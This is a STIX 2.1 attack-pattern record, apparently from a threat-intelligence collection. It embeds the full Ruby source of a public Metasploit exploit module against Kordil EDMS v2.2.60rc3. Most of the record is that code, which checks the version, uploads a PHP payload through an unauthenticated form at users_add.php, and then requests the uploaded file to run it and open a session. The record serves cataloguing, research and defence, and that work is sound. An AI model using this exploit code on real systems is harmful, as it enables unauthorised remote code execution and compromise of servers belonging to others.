{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--21f56109-4278-490f-9d0e-a1a12df4aaee",
    "created": "2024-08-14T17:08:20.369714Z",
    "modified": "2024-08-14T17:08:20.369718Z",
    "name": "\"Kordil EDMS v2.2.60rc3 Unauthenticated Arbitrary File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability in Kordil EDMS v2.2.60rc3. This application has an upload feature that allows an unauthenticated user to upload arbitrary files to the '/kordil_edms/userpictures/' directory.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/kordil_edms_upload_exec.rb",
            "external_id": "kordil_edms_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Kordil EDMS v2.2.60rc3 Unauthenticated Arbitrary File Upload Vulnerability\",\n        'Description' => %q{\n          This module exploits a vulnerability in Kordil EDMS v2.2.60rc3.\n          This application has an upload feature that allows an unauthenticated user\n          to upload arbitrary files to the '/kordil_edms/userpictures/' directory.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'bcoles' # Discovery and exploit\n        ],\n        'References' => [\n          ['OSVDB', '90645'],\n          ['EDB', '24547'],\n        ],\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2013-02-22',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the web application', '/kordil_edms/']),\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    base = target_uri.path\n    peer = \"#{rhost}:#{rport}\"\n\n    # retrieve software version from login page\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(base, 'global_group_login.php')\n      })\n      if res and res.code == 200\n        if res.body =~ /<center><font face=\"Arial\" size=\"2\">Kordil EDMS v2\\.2\\.60/\n          return Exploit::CheckCode::Appears\n        elsif res.body =~ /Kordil EDMS v/\n          return Exploit::CheckCode::Detected\n        end\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def upload(base, file)\n    data = Rex::MIME::Message.new\n    data.add_part(file, 'text/x-php', nil, \"form-data; name=\\\"upload_fd31\\\"; filename=\\\"#{@fname}.php\\\"\")\n    data.add_part(\"#{@fname}\", nil, nil, 'form-data; name=\"add_fd0\"')\n    data.add_part(\"#{@fname}\", nil, nil, 'form-data; name=\"add_fd27\"')\n    data.add_part(\"n\", nil, nil, 'form-data; name=\"act\"')\n    data_post = data.to_s\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(base, 'users_add.php'),\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data_post\n    })\n    return res\n  end\n\n  def on_new_session(client)\n    if client.type == \"meterpreter\"\n      client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n      client.fs.file.rm(\"#{@fname}.php\")\n    else\n      client.shell_command_token(\"rm #{@fname}.php\")\n    end\n  end\n\n  def exploit\n    base = target_uri.path\n    @fname = rand_text_numeric(7)\n\n    # upload PHP payload to userpictures/[fname].php\n    print_status(\"Uploading PHP payload (#{payload.encoded.length} bytes)\")\n    php = %Q|<?php #{payload.encoded} ?>|\n    begin\n      res = upload(base, php)\n      if res and res.code == 302 and res.headers['Location'] =~ /\\.\\/user_account\\.php\\?/\n        print_good(\"File uploaded successfully\")\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Uploading PHP payload failed\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n    # retrieve and execute PHP payload\n    print_status(\"Executing payload (userpictures/#{@fname}.php)\")\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(base, 'userpictures', \"#{@fname}.php\")\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-22",
    "x_mitre_platforms": [
        "php'"
    ]
}